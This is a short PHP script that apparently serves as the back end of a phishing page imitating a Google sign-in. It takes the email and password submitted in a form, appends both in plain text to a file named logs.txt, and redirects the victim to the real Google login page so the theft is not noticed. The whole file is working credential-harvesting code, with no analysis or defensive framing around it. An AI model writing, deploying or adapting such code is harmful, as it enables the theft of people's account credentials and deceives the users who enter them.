<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];
    
    $log = "logs.txt";
    $data = "Email: $email | Password: $password\n";
    
    file_put_contents($log, $data, FILE_APPEND);
    
    header("Location: https://accounts.google.com/signin"); // Redirect to real Google page
    exit();
}
?>
